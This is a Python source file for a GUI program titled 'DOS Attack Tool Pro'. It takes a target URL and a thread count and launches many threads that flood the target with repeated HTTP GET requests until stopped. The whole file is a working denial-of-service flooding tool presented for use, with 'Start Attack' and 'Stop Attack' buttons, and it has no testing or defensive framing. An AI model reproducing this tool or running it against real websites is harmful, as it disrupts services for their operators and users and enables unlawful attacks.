#!/usr/bin/env python3

import requests
import threading
import argparse
import time
import tkinter as tk
from tkinter import messagebox


class DosAttackToolGUI:
    def __init__(self):
        self.window = tk.Tk()
        self.window.title("DOS Attack Tool Pro")
        self.window.geometry("800x500")
        self.window.resizable(0, 0)

        # Create a cool banner label
        self.banner_text = """
         _____                ______       _
        |  __ \              |  ____|     | |
        | |__) |___ _ __ ___ | |__   _ __ | |_ ___
        |  _  // _ \ '_ ` _ \|  __| | '_ \| __/ __|
        | | \ \  __/ | | | | | |____| | | | |_\__ \\
        |_|  \_\___|_| |_| |_|______|_| |_|\__|___/
        """
        self.banner_label = tk.Label(self.window, text=self.banner_text, font=("Courier New", 20, "bold"))
        self.banner_label.pack(pady=(10, 0))

        self.target_url = ""
        self.num_threads = 0
        self.num_requests = 0
        self.verbose = False
        self.threads = []
        self.is_attack_running = False

        self.create_input_fields()
        self.create_output_frame()
        self.create_button()

    def create_input_fields(self):
        frame = tk.Frame(self.window)
        frame.pack(pady=20)

        url_label = tk.Label(frame, text="Target URL:", font=("Arial", 14))
        url_label.grid(row=0, column=0, padx=(0, 10))
        self.url_entry = tk.Entry(frame, width=30, font=("Arial", 14))
        self.url_entry.grid(row=0, column=1)

        threads_label = tk.Label(frame, text="Number of Threads:", font=("Arial", 14))
        threads_label.grid(row=1, column=0, padx=(0, 10))
        self.threads_entry = tk.Entry(frame, width=10, font=("Arial", 14))
        self.threads_entry.grid(row=1, column=1)

        requests_label = tk.Label(frame, text="Number of Requests per Thread:", font=("Arial", 14))
        requests_label.grid(row=2, column=0, padx=(0, 10))
        self.requests_entry = tk.Entry(frame, width=10, font=("Arial", 14))
        self.requests_entry.grid(row=2, column=1)

        self.verbose_var = tk.BooleanVar()
        self.verbose_var.set(False)
        verbose_check = tk.Checkbutton(frame, text="Enable Verbose Output", var=self.verbose_var,
                                       font=("Arial", 14))
        verbose_check.grid(row=3, columnspan=2, pady=(10, 0))

    def create_output_frame(self):
        frame = tk.Frame(self.window)
        frame.pack()

        output_title = tk.Label(frame, text="Output:", font=("Arial", 16, "bold"))
        output_title.pack(anchor="w", pady=(10, 5))

        self.output_text = tk.Text(frame, height=10, width=80, font=("Arial", 12), state=tk.DISABLED)
        self.output_text.pack()

    def create_button(self):
        frame = tk.Frame(self.window)
        frame.pack(pady=(20, 0))

        start_button = tk.Button(frame, text="Start Attack", font=("Arial", 14), command=self.start_attack)
        start_button.pack(side="left", padx=(0, 10))

        stop_button = tk.Button(frame, text="Stop Attack", font=("Arial", 14), command=self.stop_attack)
        stop_button.pack(side="left")

    def start_attack(self):
        if self.is_attack_running:
            print("Error: Attack is already running!")
            return

        self.target_url = self.url_entry.get()
        self.num_threads = int(self.threads_entry.get())
        self.num_requests = int(self.requests_entry.get())
        self.verbose = self.verbose_var.get()

        if not self.target_url or not self.num_threads or not self.num_requests:
            print("Error: Please enter all the required fields!")
            return

        self.is_attack_running = True

        for i in range(self.num_threads):
            thread = threading.Thread(target=self.send_requests, name=f"Thread-{i + 1}")
            thread.start()
            self.threads.append(thread)

    def stop_attack(self):
        if not self.is_attack_running:
            print("Error: Attack is not running!")
            return

        self.is_attack_running = False

        for thread in self.threads:
            thread.join()

        print("Attack Finished: DOS attack finished!")

    def send_requests(self):
        session = requests.Session()
        session.headers = {
            'Connection': 'keep-alive',
            'Content-Type': 'text/html',
        }

        while self.is_attack_running:
            for _ in range(self.num_requests):
                try:
                    response = session.get(self.target_url)
                    if self.verbose:
                        self.output_text.config(state=tk.NORMAL)
                        self.output_text.insert(tk.END,
                                                f"Request sent | Thread: {threading.current_thread().name} | Status Code: {response.status_code}\n")
                        self.output_text.see(tk.END)
                        self.output_text.config(state=tk.DISABLED)

                except requests.exceptions.RequestException as e:
                    if self.verbose:
                        self.output_text.config(state=tk.NORMAL)
                        self.output_text.insert(tk.END, f"Error occurred: {e}\n")
                        self.output_text.see(tk.END)
                        self.output_text.config(state=tk.DISABLED)
                    pass

                time.sleep(0.01)

        self.output_text.config(state=tk.NORMAL)
        self.output_text.insert(tk.END, f"Thread {threading.current_thread().name} stopped\n")
        self.output_text.see(tk.END)
        self.output_text.config(state=tk.DISABLED)


if __name__ == '__main__':
    try:
        dos_attack_tool = DosAttackToolGUI()
        dos_attack_tool.window.mainloop()
    except tk.TclError:
        print("No GUI environment detected.")
